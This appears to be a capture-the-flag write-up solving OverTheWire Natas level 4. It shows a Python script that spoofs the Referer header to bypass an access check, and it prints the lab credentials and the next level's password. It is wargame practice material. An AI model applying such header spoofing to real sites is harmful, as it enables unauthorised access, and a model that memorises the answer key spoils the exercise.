# Level 4

URL : http://natas4.natas.labs.overthewire.org/

#### Creds for level4

**natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ**


## Solution

once visiting the page we see:  

>  Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/".

This means we need to change the referer header to "http://natas5.natas.labs.overthewire.org/", and we will have access.

let's try it

```python
import requests
# set Referer
headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
# request page
res = requests.get("http://natas4.natas.labs.overthewire.org/", headers=headers, auth=('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'))
# print the response body
print(res.text)
```


## Result
**Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**.










